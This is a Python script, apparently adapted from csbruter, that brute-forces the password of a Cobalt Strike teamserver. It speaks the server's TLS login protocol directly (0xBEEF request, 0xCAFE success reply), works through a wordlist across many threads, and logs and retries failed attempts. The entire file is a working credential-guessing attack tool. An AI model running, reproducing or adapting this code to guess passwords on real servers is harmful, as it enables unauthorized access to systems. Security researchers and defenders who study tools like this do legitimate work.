import argparse
import logging
import os
import socket
import ssl
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# CS Teamserver密码爆破工具
# 在 https://github.com/ryanohoro/csbruter 基础上进行修改


class NotConnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class DisconnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class Connector:
    def __init__(self):
        self.sock = None
        self.ssl_sock = None
        self.ctx = ssl.SSLContext()
        self.ctx.verify_mode = ssl.CERT_NONE
        pass

    def is_connected(self):
        return self.sock and self.ssl_sock

    def open(self, hostname, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(2)
        self.ssl_sock = self.ctx.wrap_socket(self.sock)

        if hostname == socket.gethostname():
            ipaddress = socket.gethostbyname_ex(hostname)[2][0]
            self.ssl_sock.connect((ipaddress, port))
        else:
            self.ssl_sock.connect((hostname, port))

    def close(self):
        if self.sock:
            self.sock.close()
        self.sock = None
        self.ssl_sock = None

    def send(self, buffer):
        if not self.ssl_sock:
            raise NotConnectedException("Not connected (SSL Socket is null)")
        self.ssl_sock.sendall(buffer)
        # 解决socket.timeout: The read operation timed out问题，将超时时间加长
        self.ssl_sock.settimeout(100)

    def receive(self):
        if not self.ssl_sock:
            raise NotConnectedException("Not connected (SSL Socket is null)")
        received_size = 0
        data_buffer = b""

        while received_size < 4:
            data_in = self.ssl_sock.recv()
            data_buffer = data_buffer + data_in
            received_size += len(data_in)

        return data_buffer


def passwordCheck(password):
    result = None
    conn = Connector()
    conn.open(args.host, args.port)
    payload = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(
        bytes(password, "ascii").ljust(256, b"A"))
    conn.send(payload)
    if conn.is_connected():
        result = conn.receive()
    if conn.is_connected():
        conn.close()
    if result == bytearray(b"\x00\x00\xca\xfe"):
        return password
    else:
        return False


parser = argparse.ArgumentParser()

parser.add_argument("host",
                    help="teamserver address, example: 1.1.1.1")
parser.add_argument("wordlist", nargs="?",
                    help="password file path, example: d:\dic\pass.txt")
parser.add_argument("-p", dest="port", default=50050, type=int,
                    help="teamserver port, default=50050")
parser.add_argument("-t", dest="threads", default=40, type=int,
                    help="concurrency level, default=40")

args = parser.parse_args()

currentTime = time.strftime("%Y-%m-%d-%H%M%S", time.localtime())

# 开启日志记录
logging.basicConfig(filename=os.path.join(
    os.getcwd(), 'log-'+currentTime+'.txt'), level=logging.INFO)


errorSocketPassList = []
isSuccess = False
# 多线程
executor = ThreadPoolExecutor(max_workers=args.threads)
startTime = time.time()
with open(args.wordlist, "r", encoding="utf-8") as data:
    results = {executor.submit(passwordCheck, i.strip()): i for i in data}
    # 因为concurrent.futures.as_completed(results)返回的值是迭代器，因此我们可以使用for循环来遍
    for res in as_completed(results):
        try:
            if res.result():
                print("\033[0;31m%s\033[0m" %
                      "发现TeamServer密码: {}".format(res.result()))
                logging.info(args.host+':'+str(args.port)+': ' +
                             "发现TeamServer密码: {}".format(res.result()))
                print("程序仍在继续，请手动结束进程")
                # isSuccess.append("res.result()")
                isSuccess = True
                break
            else:
                print("错误密码: %s" % (results[res].strip()))
                logging.info("错误密码: %s" % (results[res].strip()))
        except Exception as error:
            print("错误: %s，待重试密码: %s" % (error, results[res].strip()))
            logging.warning("错误: %s，待重试密码: %s" % (error, results[res].strip()))
            # 当出现错误时，将出现错误的密码放入新的字典
            errorSocketPassList.append(results[res].strip())
data.close()

if isSuccess == False:
    # 重试出现错误的密码
    if errorSocketPassList:
        print("正在重试..........")
        results2 = {executor.submit(
            passwordCheck, i.strip()): i for i in errorSocketPassList}
        for res2 in as_completed(results2):
            try:
                if res2.result():
                    print("\033[0;31m%s\033[0m" %
                          "发现TeamServer密码: {}".format(res2.result()))
                    logging.info(args.host+':'+str(args.port)+': ' +
                                 "发现TeamServer密码: {}".format(res2.result()))
                    print("程序仍在继续，请手动结束进程")
                    break
                else:
                    print("错误密码: %s" % (results2[res2].strip()))
                    logging.info("错误密码: %s" % (results2[res2].strip()))
            except Exception as error:
                print("重试错误: %s，密码: %s" % (error, results2[res2].strip()))
                logging.error("重试失败: %s，连接存在错误的密码: %s" %
                              (error, results2[res2].strip()))

endTime = time.time()
print("耗时: "+str(endTime-startTime)+"秒")
